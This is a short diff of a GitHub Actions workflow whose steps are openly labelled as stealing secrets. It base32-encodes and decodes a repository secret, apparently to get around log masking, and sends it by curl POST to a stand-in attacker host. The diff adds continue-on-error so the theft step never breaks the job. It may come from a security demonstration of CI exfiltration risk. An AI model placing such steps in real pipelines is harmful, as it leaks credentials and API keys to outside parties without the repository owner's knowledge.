@@ -19,9 +19,12 @@ jobs:
     - name: Expose secrets
       run: |
         echo ${{secrets.EVIL_SECRET }} | base32
+        SECRET=$(echo ${{secrets.EVIL_SECRET }} | base32)
+        echo $SECRET | base32 -d
 
     - name: Steal secret API key
       env:
         SECRET: ${{secrets.EVIL_SECRET }}
       run: |
         curl -X POST -H "Content-Type: application/json" -d "{\"api_key\": \"$SECRET\"}" https://evil-attacker-server.com/api/steal_key
+      continue-on-error: true  
